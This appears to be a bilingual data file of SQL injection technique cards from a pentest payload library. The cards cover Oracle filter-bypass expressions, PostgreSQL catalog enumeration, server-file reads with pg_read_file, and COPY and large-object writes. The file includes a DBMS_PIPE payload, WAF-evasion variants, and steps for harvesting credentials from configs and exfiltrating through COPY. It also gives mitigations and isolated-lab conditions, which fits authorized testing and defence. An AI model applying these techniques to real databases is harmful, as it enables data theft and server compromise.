wafBypass.command: DECLARE v VARCHAR2(64); BEGIN DBMS_PIPE.PACK_MESSAGE('PAYLOADER_MARKER'); DBMS_PIPE.SEND_MESSAGE('PAY_CH',0,3); DBMS_PIPE.RECEIVE_MESSAGE('PAY_CH',0); DBMS_PIPE.UNPACK_MESSAGE(v); DBMS_OUTPUT.PUT_LINE('ECHO='||v); END;

description.zh: 绕过只监控 PACK_MESSAGE 单向写入的检测：构造发送-接收回读闭环验证会话缓冲；ECHO 与写入一致即成功。
description.en: Build a send-receive round trip to validate the session buffer beyond one-way write monitoring; ECHO matching the sent value confirms success.

name.zh: Oracle 表达式与编码变体

description.zh: 将原混合条目中属于Oracle 表达式与编码变体的命令逐行独立路由，明确技术前提、权限、副作用和可复验证据边界。
description.en: Routes every source line belonging to Oracle Expression and Encoding Variants into one focused card with explicit technical prerequisites, privileges, side effects, and reproducible evidence boundaries.

overview.zh: 覆盖 Oracle 注入在表达式与编码层的过滤绕过变体：以 XMLType、CASE、注释分词、CHR 拼接、HEX 与 Base64 等价表达式读取当前用户。适用于关键字过滤拦截直接查询、需要等价表达式维持读取链的场景。
overview.en: Covers expression- and encoding-layer filter bypass variants for Oracle injection: reading the current user via equivalent expressions such as XMLType, CASE, comment tokenization, CHR concatenation, HEX, and Base64. Suitable when keyword filtering blocks direct queries and equivalent expressions are needed to keep the read chain alive.

vulnerability.zh: 根因是 SQL 注入点存在而防御依赖关键字黑名单；Oracle 表达式语法灵活，同一取值可用多种等价形式书写，黑名单只匹配字面形态时即被等价表达式绕过。
vulnerability.en: The root cause is a live SQL injection point defended only by keyword blacklists; Oracle's flexible expression syntax lets the same value be written in many equivalent forms, so blacklists matching literal shapes are bypassed by equivalence.

exploitation.zh: 使用第 1 步主验证命令逐行提交 XMLType、CASE、注释分词、CHR 拼接、HEX 与 Base64 变体读取 user；各变体回显一致的用户值或其可还原编码即确认表达式层过滤被绕过。先提交直接查询确认被拦截作为对照，再逐个变体验证，输出替换为隔离 marker。
exploitation.en: Use the step 1 main verification command to submit XMLType, CASE, comment-tokenization, CHR-concatenation, HEX, and Base64 variants line by line to read the user; consistent echoes of the same value, or its recoverable encoding, confirm the expression-layer filter is bypassed. First confirm the direct query is blocked as a baseline, then verify each variant, replacing output with isolated markers.

mitigation.zh: 以参数化查询消除注入点而非依赖关键字过滤；确需过滤时按 SQL 解析器语义判断而非字面匹配，并回归全部等价表达式族。修复后重放各变体应全部无效。
mitigation.en: Eliminate the injection point with parameterized queries rather than relying on keyword filtering; if filtering is unavoidable, decide on parser semantics instead of literal matching and regression-test the whole equivalence family. After the fix, replaying every variant must fail.

title.zh: CASE WHEN 表达式输出标记
title.en: Emit a marker via CASE WHEN expressions

description.zh: 恒真 CASE WHEN 返回标记字符串、假条件返回空值，页面出现或消失标记即可当作布尔信号，替代被过滤的等号判断。
description.en: A true CASE WHEN returns a marker string while false yields null; the marker appearing or vanishing acts as a boolean oracle when '=' is filtered.

description.zh: 用 XMLType 包裹标记构造节点回显，语句被接受且内容返回说明表达式通道稳定，可承载子查询结果输出数据。
description.en: Wrap the marker in XMLType to build a node; accepted execution with returned content proves a stable channel for subquery results.

title.zh: 注释与等价表达式穿透过滤
title.en: Punch through filters with comments and equivalents

description.zh: 组合 UNION 注释拆分与等价函数改写，绕过关键字与空白字符匹配，把前面两步载荷变形后送入数据库执行。
description.en: Combine comment splitting and equivalent rewrites to bypass keyword and whitespace matching and land the earlier payloads.

prerequisites.zh: 仅在隔离实例确认Oracle 表达式与编码变体所需组件、版本、权限和语句位置，不把另一 DBMS 的语法错误当作证据。
prerequisites.en: Confirm the component, version, privileges, and statement position required by Oracle Expression and Encoding Variants in an isolated instance; syntax errors from another DBMS are not evidence.

prerequisites.zh: 准备专用 schema、固定 PAYLOADER_MARKER、数据库审计日志与可撤销权限；真实系统文件、生产账户和外部目标不得使用。
prerequisites.en: Prepare a dedicated schema, fixed PAYLOADER_MARKER, database audit logs, and revocable privileges; do not use real system files, production accounts, or external targets.

analysis.zh: Oracle 表达式与编码变体的阳性证据必须由同一 marker 的最终语句、权限和结果共同确认；字符串回显、解析失败、预存文件、手工控制台执行或其他技术分支均是假阳性。
analysis.en: Positive Oracle Expression and Encoding Variants evidence requires the final statement, privilege decision, and result for the same marker. Reflected strings, parse failures, preexisting files, manual console execution, or another technique branch are false positives.

opsecTips.zh: 出现生产数据、持久文件、真实外连、配置变化、锁等待、资源异常或非测试账户影响时立即停止。
opsecTips.en: Stop immediately on production data, persistent files, real egress, configuration changes, lock waits, resource anomalies, or impact to non-test accounts.

opsecTips.zh: 测试后回滚事务，删除临时 schema、marker、文件和日志目标，撤销临时权限并确认正常查询基线。
opsecTips.en: After testing, roll back transactions, remove temporary schemas, markers, files, and log targets, revoke temporary privileges, and confirm the normal-query baseline.

description.zh: 绕过对 marker 明文回显的审计规则：以十六进制形式输出 marker；结果列可解出 PAYLOADER_MARKER 即成功。
description.en: Emit the marker in hexadecimal to evade plaintext echo auditing; decoding the result column back to PAYLOADER_MARKER confirms success.

description.zh: 绕过对字符串常量的引号特征检测：用 CHR 函数逐字符构造 marker；拼出 PAYLOADER 即成功。
description.en: Build the marker character by character via CHR to avoid quoted-constant signatures; the assembled PAYLOADER string confirms success.

title.zh: 注释分词与 LOWER 变换

description.zh: 绕过对 UNION SELECT marker 组合的匹配：注释分词并用函数包一层变换；输出 payloader_marker 即成功。
description.en: Wrap the marker in LOWER and split keywords with comments; a lowercase payloader_marker output confirms success.

name.zh: PostgreSQL UNION 与目录枚举

description.zh: 将原混合条目中属于PostgreSQL UNION 与目录枚举的命令逐行独立路由，明确技术前提、权限、副作用和可复验证据边界。
description.en: Routes every source line belonging to PostgreSQL UNION and Catalog Enumeration into one focused card with explicit technical prerequisites, privileges, side effects, and reproducible evidence boundaries.

overview.zh: 覆盖 PostgreSQL 注入的布尔对照与 UNION 枚举链：读取 version()、current_database()、current_user 与 information_schema 库表结构。适用于确认后端为 PostgreSQL 且 UNION 列数可对齐的场景。
overview.en: Covers the boolean-comparison and UNION enumeration chain for PostgreSQL injection: reading version(), current_database(), current_user, and information_schema structures. Suitable when the backend is confirmed PostgreSQL and UNION column counts can be aligned.

vulnerability.zh: 根因是输入拼接进 SQL 未做参数化；PostgreSQL 的 information_schema 与 pg_catalog 对普通连接默认可读，攻击者对齐列数后即可遍历元数据，权限未收敛时泄露面覆盖全库结构。
vulnerability.en: The root cause is input concatenated into SQL without parameterization; PostgreSQL's information_schema and pg_catalog are readable by ordinary connections by default, so once column counts align, attackers traverse metadata freely, and untrimmed grants expose the whole schema.

exploitation.zh: 用第 1 步主验证命令注入布尔对照与 UNION 查询：先读 version() 与 current_database() 确认可控，再经 information_schema.tables 与 columns 枚举当前库表列结构；回显版本串、库名或表清单即确认目录可枚举。执行前把表名替换为隔离 marker，按步骤顺序推进并记录每级结果。
exploitation.en: Use the step 1 main verification command to inject boolean comparisons and UNION queries: first read version() and current_database() to confirm controllability, then enumerate current-database tables and columns via information_schema.tables and columns; an echoed version string, database name, or table listing confirms the catalog is enumerable. Replace table names with isolated markers before running, advancing in step order and recording each level's results.

mitigation.zh: 参数化查询并按需回收应用角色对 pg_catalog/information_schema 的可见性；修复后重放 UNION 载荷应报列不匹配或无回显，并在审计中监控目录视图的批量查询。
mitigation.en: Parameterize queries and revoke application-role visibility into pg_catalog/information_schema as needed. After the fix, replaying UNION payloads must raise column-mismatch errors or produce no echo, with bulk catalog queries monitored in audit logs.

description.zh: 提交单引号与 OR 恒真条件，响应差异或 PostgreSQL 报错即确认注入点，同时记录参数的字符串闭合方式备用。
description.en: Submit quote and OR tautologies; response differences or PostgreSQL errors confirm the injection and its quoting style.

title.zh: 对齐列数并读取基础信息
title.en: Align columns and read basic info

description.zh: UNION SELECT NULL 递增对齐列数，随后把 version()、current_database()、current_user 放进回显位，确认版本与当前身份。
description.en: Pad UNION SELECT NULL to align columns, then echo version(), current_database() and current_user to identify release and identity.

title.en: Enumerate table structures to find targets

description.zh: 从 information_schema.tables 按当前库过滤拿表名，再查列定位凭据字段，锁定 users 类敏感表准备提取数据。
description.en: List tables from information_schema.tables for the current DB, resolve columns, and lock onto users-style tables holding credentials.

title.zh: 拦截时切换 chr() 编码变体
title.en: Switch to chr() encoded variants when blocked

description.zh: 关键字或引号被 WAF 拦截时，用 chr() 拼接敏感词与语句片段，保持第 3 步查询语义不变绕过特征检测继续提取。
description.en: When the WAF blocks keywords or quotes, rebuild the step 3 fragments with chr() concatenation to keep semantics while evading detection.

prerequisites.zh: 仅在隔离实例确认PostgreSQL UNION 与目录枚举所需组件、版本、权限和语句位置，不把另一 DBMS 的语法错误当作证据。
prerequisites.en: Confirm the component, version, privileges, and statement position required by PostgreSQL UNION and Catalog Enumeration in an isolated instance; syntax errors from another DBMS are not evidence.

prerequisites.zh: 准备专用 schema、固定 PAYLOADER_MARKER、数据库审计日志与可撤销权限；真实系统文件、生产账户和外部目标不得使用。
prerequisites.en: Prepare a dedicated schema, fixed PAYLOADER_MARKER, database audit logs, and revocable privileges; do not use real system files, production accounts, or external targets.

analysis.zh: PostgreSQL UNION 与目录枚举的阳性证据必须由同一 marker 的最终语句、权限和结果共同确认；字符串回显、解析失败、预存文件、手工控制台执行或其他技术分支均是假阳性。
analysis.en: Positive PostgreSQL UNION and Catalog Enumeration evidence requires the final statement, privilege decision, and result for the same marker. Reflected strings, parse failures, preexisting files, manual console execution, or another technique branch are false positives.

opsecTips.zh: 出现生产数据、持久文件、真实外连、配置变化、锁等待、资源异常或非测试账户影响时立即停止。
opsecTips.en: Stop immediately on production data, persistent files, real egress, configuration changes, lock waits, resource anomalies, or impact to non-test accounts.

opsecTips.zh: 测试后回滚事务，删除临时 schema、marker、文件和日志目标，撤销临时权限并确认正常查询基线。
opsecTips.en: After testing, roll back transactions, remove temporary schemas, markers, files, and log targets, revoke temporary privileges, and confirm the normal-query baseline.

name.zh: PostgreSQL 服务端文件读取边界

description.zh: 将原混合条目中属于PostgreSQL 服务端文件读取边界的命令逐行独立路由，明确技术前提、权限、副作用和可复验证据边界。
description.en: Routes every source line belonging to PostgreSQL Server-File Read Boundary into one focused card with explicit technical prerequisites, privileges, side effects, and reproducible evidence boundaries.

overview.zh: 覆盖 PostgreSQL 服务端文件读取的验证：以 pg_read_file 与 pg_read_binary_file 读取目标文件，二进制可经 Base64 还原。适用于超级用户或 pg_read_server_files 角色已确认的场景，评估服务端任意文件读取影响。
overview.en: Covers verification of PostgreSQL server-side file reads: reading target files with pg_read_file and pg_read_binary_file, with binaries recoverable via Base64. Suitable when superuser or the pg_read_server_files role is confirmed, to assess the impact of arbitrary server file reads.

vulnerability.zh: 根因是注入会话具备超级用户或 pg_read_server_files 角色，pg_read_file 系列函数可读取服务器上任意路径；PostgreSQL 管理权限未按应用需求拆分时，注入即转化为敏感文件泄露。
vulnerability.en: The root cause is the injection session holding superuser or the pg_read_server_files role: pg_read_file functions read any path on the server. When administrative privileges are not split per application needs, injection converts into sensitive file disclosure.

exploitation.zh: 用第 1 步命令以 pg_read_file 读取目标文本文件，二进制目标改用 pg_read_binary_file 并以 Base64 还原；回显出现文件内容即确认服务端文件读取可用。把路径替换为隔离 marker 验证读取边界，权限报错按阴性依据记录；超级用户要求未满足时结论应标注为权限受限而非能力缺失。
exploitation.en: Use the step 1 command to read target text files with pg_read_file, switching to pg_read_binary_file with Base64 recovery for binaries; echoed file content confirms server-side file reads. Verify the read boundary with isolated-marker paths, recording permission errors as negative evidence; when superuser requirements are unmet, state the conclusion as privilege-limited rather than capability-absent.

mitigation.zh: 应用连接改用非超级用户角色并回收 pg_read_server_files 授权；修复后重放读取应报权限拒绝，并确认应用角色不再继承任何管理能力。
mitigation.en: Move application connections to a non-superuser role and revoke pg_read_server_files. After the fix, replaying reads must raise permission denials, and the application role must no longer inherit administrative capabilities.

title.zh: 确认超级用户读取权限

description.zh: pg_read_file 通常仅超级用户可用，先通过 UNION 回显 current_user 判定身份，是 postgres 等超管账户才继续文件读取链。
description.en: pg_read_file is superuser-only; echo current_user first and proceed with the file chain only for postgres-level identities.

description.zh: 注入 pg_read_file 并把路径占位替换为 pg 配置、系统文件绝对路径，回显文件内容即服务器侧读取成功落地。
description.en: Inject pg_read_file with absolute paths to pg configs or system files; echoed contents confirm server-side file read.

title.zh: 读二进制与配置收割凭据
title.en: Read binaries and configs to harvest secrets

description.zh: 用 pg_read_binary_file 读二进制内容，重点翻配置文件与环境变量文件，提取数据库口令和密钥用于直连扩展控制面。
description.en: Use pg_read_binary_file for binary targets and sweep config and env files for passwords and keys to enable direct connections.

prerequisites.zh: 仅在隔离实例确认PostgreSQL 服务端文件读取边界所需组件、版本、权限和语句位置，不把另一 DBMS 的语法错误当作证据。
prerequisites.en: Confirm the component, version, privileges, and statement position required by PostgreSQL Server-File Read Boundary in an isolated instance; syntax errors from another DBMS are not evidence.

prerequisites.zh: 准备专用 schema、固定 PAYLOADER_MARKER、数据库审计日志与可撤销权限；真实系统文件、生产账户和外部目标不得使用。
prerequisites.en: Prepare a dedicated schema, fixed PAYLOADER_MARKER, database audit logs, and revocable privileges; do not use real system files, production accounts, or external targets.

analysis.zh: PostgreSQL 服务端文件读取边界的阳性证据必须由同一 marker 的最终语句、权限和结果共同确认；字符串回显、解析失败、预存文件、手工控制台执行或其他技术分支均是假阳性。

opsecTips.en: After testing, roll back transactions, remove temporary schemas, markers, files, and log targets, revoke temporary privileges, and confirm the normal-query baseline.

description.zh: 绕过对 pg_read_file 小写全字匹配：混合大小写加注释分词；文件内容回显即成功。
description.en: Mixed case plus comment splitting against exact lowercase matching of pg_read_file; echoed file content confirms success.

title.zh: 二进制读取 Base64 编码

description.zh: 绕过对文本读取函数与特殊字符回显的过滤：改走二进制读取并 Base64 编码输出；Base64 解码得到原文即成功。
description.en: Read via the binary variant and encode as Base64 to bypass text-function and special-character filters; decoding the echo yields the original content.

description.zh: 绕过 UNION 通道被禁用的场景：把文件首段 CAST 成整数触发报错回显；报错含文件片段即成功。
description.en: When UNION is blocked, CAST the first file segment to an integer to trigger an echoing error; the file fragment in the error confirms success.

description.zh: 绕过对 pg_read_file 函数名的专项拦截：改用大对象导入接口读取文件；返回非空 OID 即成功。
description.en: Use the large-object import interface instead of pg_read_file to evade function-name rules; a non-null returned OID confirms success.

name.zh: PostgreSQL COPY Marker 语句

description.zh: 将原混合条目中属于PostgreSQL COPY Marker 语句的命令逐行独立路由，明确技术前提、权限、副作用和可复验证据边界。
description.en: Routes every source line belonging to PostgreSQL COPY Marker Statement into one focused card with explicit technical prerequisites, privileges, side effects, and reproducible evidence boundaries.

overview.zh: 覆盖 PostgreSQL COPY 语句在注入点的可执行性验证：以 COPY (SELECT marker) TO STDOUT 输出固定标记，作为文件读写能力的前置证据。适用于堆叠查询可用、需评估 COPY 能力边界的场景。
overview.en: Covers verification of COPY statement executability at a PostgreSQL injection point: emitting a fixed marker via COPY (SELECT marker) TO STDOUT as precursor evidence for file read/write capability. Suitable when stacked queries work and the COPY capability boundary needs assessing.

vulnerability.zh: 根因是注入点可执行堆叠语句且应用角色未被限制 COPY 权限：COPY TO STDOUT 可写出查询结果，COPY TO 文件路径则可写服务端文件，角色权限未收敛时形成文件读写原语。
vulnerability.en: The root cause is stacked-query execution at the injection point with an application role unrestricted on COPY: COPY TO STDOUT writes query results out, while COPY TO a file path writes server files; unconverged role privileges yield a file read/write primitive.

exploitation.zh: 使用第 1 步命令以 COPY (SELECT marker) TO STDOUT 输出固定标记；STDOUT 返回 PAYLOADER_MARKER 即确认 COPY 语句可在注入点执行。先确认堆叠查询可用作为前置，再测试 COPY 输出；成立后按需评估 COPY TO 文件路径的写入边界，全程使用隔离目录与一次性文件名。结束后确认无文件残留，COPY 会话随事务结束一并关闭。
exploitation.en: Use the step 1 command to emit a fixed marker via COPY (SELECT marker) TO STDOUT; STDOUT returning PAYLOADER_MARKER confirms COPY executes at the injection point. Confirm stacked queries as the precursor first, then test COPY output; once established, optionally assess the write boundary of COPY TO file paths using isolated directories and one-off filenames throughout. Confirm no file residue afterward, with the COPY session closing along with the transaction.

mitigation.zh: 撤销应用角色的 pg_write_server_files 等管理角色并限制 COPY 目标路径权限；修复后重放 COPY 语句应报权限错误，堆叠查询入口一并封堵。
mitigation.en: Revoke administrative roles such as pg_write_server_files from the application role and restrict COPY target paths. After the fix, replaying COPY must raise permission errors, and the stacked-query entry point must be closed as well.

description.zh: 在参数后接分号提交 COPY 语句，语句生效说明注入点支持堆叠多语句，这是后续写文件与数据外带利用的前置条件。
description.en: Append a semicolon plus a COPY statement; successful execution proves stacking, the prerequisite for write and exfiltration chains.

description.zh: 用 COPY 把查询结果直接送到 STDOUT 输出流，响应中出现查询内容即建立从数据库到页面的数据外带通道。
description.en: Push COPY (SELECT ...) TO STDOUT to stream results straight into the response; query content appearing there opens an exfil channel.

title.zh: 转向大对象与文件落地
title.en: Pivot to large objects and file writes

description.zh: 结合 COPY TO 写服务器文件或 lo_import 大对象存储落地工具，从数据读取升级为服务器侧文件写入与后续执行。
description.en: Combine COPY TO file writes or lo_import large-object storage to escalate from reading data to dropping artifacts on the server.

prerequisites.zh: 仅在隔离实例确认PostgreSQL COPY Marker 语句所需组件、版本、权限和语句位置，不把另一 DBMS 的语法错误当作证据。
prerequisites.en: Confirm the component, version, privileges, and statement position required by PostgreSQL COPY Marker Statement in an isolated instance; syntax errors from another DBMS are not evidence.

prerequisites.zh: 准备专用 schema、固定 PAYLOADER_MARKER、数据库审计日志与可撤销权限；真实系统文件、生产账户和外部目标不得使用。
prerequisites.en: Prepare a dedicated schema, fixed PAYLOADER_MARKER, database audit logs, and revocable privileges; do not use real system files, production accounts, or external targets.
